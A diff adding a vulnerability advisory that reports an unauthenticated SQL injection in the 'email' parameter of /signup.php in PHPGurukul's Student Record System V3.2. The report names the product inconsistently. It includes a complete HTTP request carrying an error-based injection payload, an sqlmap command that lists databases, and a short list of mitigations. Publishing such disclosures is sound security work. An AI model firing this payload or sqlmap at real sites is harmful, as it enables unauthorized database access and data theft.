@@ -1,1 +1,94 @@
 
+# NAME OF AFFECTED PRODUCT(S)
+
+- Student Record System
+
+
+## Vendor Homepage
+
+
+- https://phpgurukul.com/student-record-system-php/
+
+
+# AFFECTED AND/OR FIXED VERSION(S)
+
+## submitter
+
+- 3034177456
+
+## Vulnerable File
+
+- /signup.php
+
+## VERSION(S)
+
+- V3.2
+
+## Software Link
+
+- https://phpgurukul.com/?sdm_process_download=1&download_id=7003
+
+# PROBLEM TYPE
+
+## Vulnerability Type
+
+- SQL injection
+
+## Root Cause
+
+- A SQL injection vulnerability was found in the '/signup.php'User Registration & Login and User Management System With admin panel ' project. The reason for this issue is that attackers inject malicious code from the parameter 'email' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.
+
+## Impact
+
+- Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.
+
+# DESCRIPTION
+
+- During the security review of "User Registration & Login and User Management System With admin panel",3034177456 discovered a critical SQL injection vulnerability in the "/signup.php" file. This vulnerability stems from insufficient user input validation of the 'email' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.
+
+# No login or authorization is required to exploit this vulnerability
+
+# Vulnerability details and POC
+
+## Vulnerability lonameion:
+
+- 'email' parameter
+
+## Payload:
+```
+POST /signup.php HTTP/1.1
+Host: www.test.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=s9dl7t06qalca7shqudthe3b97
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 324
+
+confirmpassword=u]H[ww6KrA9F.x-F&contact=testing@example.com&email=testing@example.com' AND (SELECT 5412 FROM(SELECT COUNT(*),CONCAT(0x7171717671,(SELECT (ELT(5412=5412,1))),0x7170717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- fPCJ&fname=eADytNmu&lname=eADytNmu&password=u]H[ww6KrA9F.x-F&submit=
+```
+
+## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
+
+```
+py sqlmap.py -r 1.txt --batch --dbs
+```
+
+![Image](https://github.com/guttlefish/vul/blob/main/img/singup.png?raw=true)
+
+
+# Recommended Mitigations
+
+- Use Prepared Statements (Parameterized Queries).
+- Sanitize User Inputs: Validate and filter all incoming data.
+- Implement Web Application Firewall (WAF).
+- Use the Principle of Least Privilege (PoLP) for database users.
+- Regularly Update and Patch the Application.
+- Monitor Logs for Suspicious Activities.
+
+### For detailed guidelines, refer to:
+https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+
